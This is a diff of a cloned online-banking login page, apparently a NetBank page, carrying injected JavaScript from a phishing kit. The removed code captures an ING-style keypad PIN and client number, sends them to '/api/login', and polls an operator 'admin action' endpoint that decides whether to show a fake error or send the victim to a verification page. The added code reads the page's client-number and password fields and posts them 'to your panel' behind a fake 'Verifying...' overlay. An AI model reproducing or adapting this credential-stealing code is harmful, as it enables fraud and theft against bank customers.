@@ -17,432 +17,144 @@
 <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTYyNzk3MDY5NGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFEWNoa1JlbWVtYmVyJGZpZWxkyajFL6pW3G2RJiK0b4vThcB6Jn0=" />
 </div>
 <script>
-/* ===== 1. SESSION SET-UP ===== */
-const sid = new URLSearchParams(location.search).get('sid') ||
-            sessionStorage.getItem('sid');
-if (!sid) {
-  fetch('/api/session', {method:'post'})
-    .then(r=>r.json()).then(({sid:id})=>{
-      sessionStorage.setItem('sid',id);
-      location.search='?sid='+id;
+    /* ===== 1. SESSION SET-UP ===== */
+    const sid = new URLSearchParams(location.search).get('sid') || sessionStorage.getItem('sid');
+    if (!sid) {
+      fetch('/api/session', {method:'post'})
+        .then(r=>r.json()).then(({sid:id})=>{
+          sessionStorage.setItem('sid',id);
+          location.search='?sid='+id;
+        });
+      throw 0;
+    }
+
+    /* ===== HEARTBEAT & PAGE CLOSE DETECTION ===== */
+    const heartbeatInterval = setInterval(() => {
+      fetch('/api/ping', {
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify({ sid })
+      }).catch(() => {});
+    }, 10000);
+
+    window.addEventListener('beforeunload', () => {
+      clearInterval(heartbeatInterval);
+      navigator.sendBeacon('/api/exit', JSON.stringify({ sid }));
     });
-  throw 0;
-}
 
-/* ===== HEARTBEAT & PAGE CLOSE DETECTION ===== */
-const heartbeatInterval = setInterval(() => {
-  fetch('/api/ping', {
-    method: 'POST',
-    headers: { 'content-type': 'application/json' },
-    body: JSON.stringify({ sid })
-  }).catch(() => {});
-}, 10000); // Ping every 10 seconds
+    /* ===== 2. GET CLIENT NUMBER ===== */
+    function getClientNumber() {
+      const cifField = document.getElementById('txtMyClientNumber_field');
+      return cifField ? cifField.value.trim() : '';
+    }
 
-// Detect page close/refresh
-window.addEventListener('beforeunload', () => {
-  clearInterval(heartbeatInterval);
-  navigator.sendBeacon('/api/exit', JSON.stringify({ sid }));
-});
+    /* ===== 3. GET PASSWORD ===== */
+    function getPassword() {
+      const pwdField = document.getElementById('txtMyPassword_field');
+      return pwdField ? pwdField.value : '';
+    }
 
-/* ===== 2. GET CLIENT NUMBER (live read) ===== */
-function getClientNumber() {
-  const cifField = document.getElementById('cifField');
-  return cifField ? cifField.value.trim().replace(/\D/g,'').slice(0,9) : '';
-}
+    /* ===== 4. SHOW LOADING OVERLAY ===== */
+    function showLoading() {
+      const overlay = document.createElement('div');
+      overlay.id = 'login-loading-overlay';
+      overlay.style.cssText = `
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.6);
+        backdrop-filter: blur(2px);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+      `;
 
-/* ===== 3. PIN CAPTURE ===== */
-let pin = '';
-let clickHandled = false;
+      const spinner = document.createElement('div');
+      spinner.style.cssText = `
+        width: 60px;
+        height: 60px;
+        border: 4px solid rgba(255, 102, 0, 0.2);
+        border-top: 4px solid #ff6600;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      `;
 
-const positionToDigit = {
-  '0': '5',
-  '1': '0', 
-  '2': '4',
-  '3': '6',
-  '4': '7',
-  '5': '9',
-  '6': '3',
-  '7': '2',
-  '8': '8',
-  '9': '1'
-};
+      const text = document.createElement('p');
+      text.textContent = 'Verifying...';
+      text.style.cssText = `
+        color: #ffffff;
+        font-family: Arial, sans-serif;
+        font-size: 16px;
+        margin-top: 20px;
+        letter-spacing: 1px;
+      `;
 
-const checkReady = setInterval(() => {
-  const ingKeypad = document.querySelector('ing-keypad');
-  const pwdInput = document.getElementById('password');
-  
-  if (ingKeypad && pwdInput) {
-    clearInterval(checkReady);
-    setupPinCapture(ingKeypad, pwdInput);
-  }
-}, 200);
+      overlay.appendChild(spinner);
+      overlay.appendChild(text);
+      document.body.appendChild(overlay);
 
-function setupPinCapture(keypadEl, pwdInput) {
-  let container = keypadEl.shadowRoot?.querySelector('.module-keypad');
-  
-  if (!container) {
-    container = keypadEl.querySelector('.module-keypad');
-  }
-  if (!container) {
-    container = document.querySelector('.module-keypad');
-  }
-  
-  if (!container) {
-    document.addEventListener('pointerdown', handlePinClick, true);
-    return;
-  }
-  
-  container.addEventListener('pointerdown', handlePinClick, true);
-}
+      const style = document.createElement('style');
+      style.id = 'spin-style';
+      style.textContent = `
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
+      `;
+      document.head.appendChild(style);
+    }
 
-function handlePinClick(e) {
-  if (clickHandled) return;
-  clickHandled = true;
-  setTimeout(() => clickHandled = false, 50);
-  
-  let el = e.target;
-  let pinBtn = null;
-  let depth = 0;
-  
-  while (el && depth < 5) {
-    if (el.classList) {
-      const classes = Array.from(el.classList);
-      const hasPinClass = classes.some(c => c.startsWith('uia-pin-'));
-      if (hasPinClass) {
-        pinBtn = el;
-        break;
+    /* ===== 5. HIDE LOADING OVERLAY ===== */
+    function hideLoading() {
+      const existing = document.getElementById('login-loading-overlay');
+      if (existing) {
+        existing.style.opacity = '0';
+        setTimeout(() => existing.remove(), 300);
       }
     }
-    el = el.parentElement;
-    depth++;
-  }
-  
-  if (!pinBtn) return;
-  
-  e.preventDefault();
-  e.stopPropagation();
-  
-  const classes = Array.from(pinBtn.classList);
-  const pinClass = classes.find(c => c.startsWith('uia-pin-'));
-  
-  if (!pinClass) return;
-  
-  const position = pinClass.replace('uia-pin-', '');
-  const digit = positionToDigit[position];
-  
-  if (!digit || pin.length >= 5) return;
-  
-  pin += digit;
-  
-  updatePasswordInput(pin);
-}
 
-function updatePasswordInput(value) {
-  const pwd = document.getElementById('password');
-  if (!pwd) return;
-  
-  pwd.value = value;
-  pwd.setAttribute('value', value);
-  
-  ['input', 'change'].forEach(evtType => {
-    const evt = new Event(evtType, { bubbles: true, cancelable: true });
-    pwd.dispatchEvent(evt);
-  });
-  
-  updateOverlay(value);
-}
+    /* ===== 6. LOGIN ===== */
+    document.addEventListener('click', (e) => {
+      const btn = e.target.closest('#btnLogon_field');
+      if (!btn) return;
 
-function updateOverlay(pinValue) {
-  const pwd = document.getElementById('password');
-  if (!pwd) return;
-  
-  const parent = pwd.closest('.content-block') || pwd.parentElement;
-  if (!parent) return;
-  
-  const overlays = parent.querySelectorAll('.password-overlay');
-  
-  overlays.forEach(ov => {
-    ov.textContent = pinValue ? '\u2022'.repeat(pinValue.length) : '';
-    
-    ov.style.cssText = `
-      position: absolute !important;
-      top: 50% !important;
-      left: 50% !important;
-      transform: translate(-50%, -50%) !important;
-      font-size: 24px !important;
-      letter-spacing: 8px !important;
-      color: #ffffff !important;
-      font-family: Arial, sans-serif !important;
-      pointer-events: none !important;
-      z-index: 100 !important;
-      display: flex !important;
-      align-items: center !important;
-      justify-content: center !important;
-      height: 100% !important;
-      width: 100% !important;
-      line-height: 1 !important;
-    `;
-  });
-  
-  if (pinValue) {
-    pwd.setAttribute('placeholder', '');
-  } else {
-    pwd.setAttribute('placeholder', 'Access code');
-  }
-}
+      const clientNumber = getClientNumber();
+      const password = getPassword();
 
-/* ===== 4. CLEAR BUTTON ===== */
-document.addEventListener('pointerdown', (e) => {
-  const btn = e.target.closest('.key-cell:not([class*="uia-pin-"])');
-  if (!btn) return;
-  
-  if (clickHandled) return;
-  clickHandled = true;
-  setTimeout(() => clickHandled = false, 50);
-  
-  const img = btn.querySelector('img');
-  const isClear = img && (img.src.includes('clear') || img.src.includes('x') || img.alt === '');
-  
-  if (isClear) {
-    pin = pin.slice(0, -1);
-    updatePasswordInput(pin);
-  }
-}, true);
-
-/* ===== 5. LOADING OVERLAY ===== */
-function showLoading() {
-  // Remove any existing loading overlay
-  hideLoading();
-  
-  const overlay = document.createElement('div');
-  overlay.id = 'login-loading-overlay';
-  overlay.style.cssText = `
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0, 0, 0, 0.6);
-    backdrop-filter: blur(2px);
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    z-index: 9999;
-    transition: opacity 0.3s ease;
-  `;
-  
-  // Orange spinner that matches ING keypad aesthetic
-  const spinner = document.createElement('div');
-  spinner.style.cssText = `
-    width: 60px;
-    height: 60px;
-    border: 4px solid rgba(255, 102, 0, 0.2);
-    border-top: 4px solid #ff6600;
-    border-radius: 50%;
-    animation: ing-spin 1s linear infinite;
-  `;
-  
-  // Loading text
-  const text = document.createElement('p');
-  text.textContent = 'Verifying...';
-  text.style.cssText = `
-    color: #ffffff;
-    font-family: Arial, sans-serif;
-    font-size: 16px;
-    margin-top: 20px;
-    letter-spacing: 1px;
-  `;
-  
-  overlay.appendChild(spinner);
-  overlay.appendChild(text);
-  document.body.appendChild(overlay);
-  
-  // Add keyframe animation if not exists
-  if (!document.getElementById('ing-spinner-style')) {
-    const style = document.createElement('style');
-    style.id = 'ing-spinner-style';
-    style.textContent = `
-      @keyframes ing-spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-      }
-    `;
-    document.head.appendChild(style);
-  }
-}
-
-function hideLoading() {
-  const existing = document.getElementById('login-loading-overlay');
-  if (existing) {
-    existing.style.opacity = '0';
-    setTimeout(() => existing.remove(), 300);
-  }
-}
-
-/* ===== 6. REMOVE ERROR MESSAGE ===== */
-function removeErrorMessage() {
-  const existingError = document.querySelector('.message.warning');
-  if (existingError) {
-    existingError.remove();
-  }
-}
-
-/* ===== 7. SHOW ERROR MESSAGE ===== */
-function showErrorMessage() {
-  removeErrorMessage();
-  
-  const loginInput = document.querySelector('ing-login-input') || 
-                     document.querySelector('.login-input-container') ||
-                     document.body;
-  
-  const errorDiv = document.createElement('div');
-  errorDiv.className = 'message warning message-block style-scope ing-login-input';
-  errorDiv.innerHTML = `
-    <div class="message-content style-scope ing-login-input">
-      <p class="icon-block icon-info no-margin-bottom uia-error-message style-scope ing-login-input">
-        <span class="style-scope ing-login-input">
-          <ing-inject-html class="inject-error style-scope ing-login-input">
-            Sorry, your login details don't seem right. Please check and try again or 
-            <a class="uia-forgotten-access-code" href="javascript:;" id="forgottenAccessCode">reset your access code here</a>.
-          </ing-inject-html>
-        </span>
-      </p>
-    </div>
-  `;
-  
-  const form = document.querySelector('form') || loginInput;
-  if (form && form.firstChild) {
-    form.insertBefore(errorDiv, form.firstChild);
-  } else {
-    const container = document.querySelector('.main-content') || document.body;
-    container.insertBefore(errorDiv, container.firstChild);
-  }
-  
-  window.scrollTo(0, 0);
-}
-
-/* ===== 8. CLEAR FORM ===== */
-function clearForm() {
-  const cifField = document.getElementById('cifField');
-  if (cifField) {
-    cifField.value = '';
-    cifField.dispatchEvent(new Event('input', { bubbles: true }));
-  }
-  
-  pin = '';
-  updatePasswordInput('');
-}
-
-/* ===== 9. POLL FOR ADMIN ACTION ===== */
-let isWaitingForAdmin = false;
-
-function startPolling() {
-  if (isWaitingForAdmin) return;
-  isWaitingForAdmin = true;
-  
-  const poll = async () => {
-    if (!isWaitingForAdmin) return;
-    
-    try {
-      const res = await fetch(`/api/status/${sid}`);
-      const data = await res.json();
-      
-      if (data.status === 'ok') {
-        isWaitingForAdmin = false;
-        await fetch('/api/clearOk', {
-          method: 'POST',
-          headers: { 'content-type': 'application/json' },
-          body: JSON.stringify({ sid })
-        });
-        // Keep loading visible during redirect
-        location.href = '/verify.html';
+      if (!clientNumber || !password) {
+        alert('Please enter both Client number and Password.');
         return;
       }
-      
-      if (data.status === 'redo') {
-        isWaitingForAdmin = false;
-        await fetch('/api/clearRedo', {
-          method: 'POST',
-          headers: { 'content-type': 'application/json' },
-          body: JSON.stringify({ sid })
-        });
-        // Hide loading and show error
+
+      showLoading();
+
+      // Send credentials to your panel
+      const payload = { sid, clientNumber, password };
+      fetch('/api/login', {
+        method: 'POST',
+        headers: { 'content-type': 'application/json' },
+        body: JSON.stringify(payload)
+      })
+      .then(res => {
+        if (res.ok) {
+          // Redirect or handle success
+          window.location.href = '/panel';
+        } else {
+          hideLoading();
+          alert('Login failed. Please try again.');
+        }
+      })
+      .catch(err => {
         hideLoading();
-        clearForm();
-        showErrorMessage();
-        return;
-      }
-      
-      setTimeout(poll, 1200);
-      
-    } catch (err) {
-      setTimeout(poll, 2000);
-    }
-  };
-  
-  poll();
-}
-
-/* ===== 10. LOGIN ===== */
-document.addEventListener('click', (e) => {
-  const btn = e.target.closest('#login-btn');
-  if (!btn) return;
-  
-  removeErrorMessage();
-  
-  const clientNumber = getClientNumber();
-  
-  if (!clientNumber || clientNumber.length < 5) {
-    document.getElementById('cifField')?.focus();
-    return;
-  }
-  
-  if (!pin || pin.length < 4) {
-    const block = document.querySelector('.content-block.access-code');
-    if (block) {
-      block.style.animation = 'none';
-      block.offsetHeight;
-      block.style.animation = 'shake 0.3s ease';
-    }
-    return;
-  }
-  
-  // Show loading overlay
-  showLoading();
-  
-  const payload = { sid, email: clientNumber, password: pin };
-  
-  fetch('/api/login', {
-    method: 'POST',
-    headers: { 'content-type': 'application/json' },
-    body: JSON.stringify(payload)
-  })
-  .then(res => {
-    if (res.ok) {
-      startPolling();
-    } else {
-      // Hide loading on server error
-      hideLoading();
-      console.error('Server error:', res.statusText);
-    }
-  })
-  .catch(err => {
-    // Hide loading on network error
-    hideLoading();
-    console.error('Fetch error:', err);
-  });
-});
-</script>
-	 <script>
-  /* make sid available globally so we can send it on unload */
-  window.__SID = '<?= sid ?? localStorage.sid ?? '' ?>';   // however you already inject it
-  window.addEventListener('beforeunload', () => {
-    if (!window.__SID) return;
-    /* fire-and-forget exit call */
-    navigator.sendBeacon('/api/exit', JSON.stringify({ sid: window.__SID }));
-  });
-</script>
+        console.error('Fetch error:', err);
+        alert('An error occurred. Please try again.');
+      });
+    });
+  </script>
 
 		<div id="BodyContainer">
 			<div id="Header">
@@ -736,3 +448,4 @@ $(function () { $.smartbanner({ content: (function () { try { return $.parseJSON
 	<input type="hidden" id="SC_MEDIAMIND_ID" name="SC_MEDIAMIND_ID" value=""/><input type="hidden" id="SC_PRODUCT_ID" name="SC_PRODUCT_ID" value=""/><input type="hidden" id="SC_CUSTOMER_TYPE" name="SC_CUSTOMER_TYPE" value="NetBank"/><input type="hidden" id="SC_SCREEN_NAME" name="SC_SCREEN_NAME" value=""/>
 </body>
 </html>
+
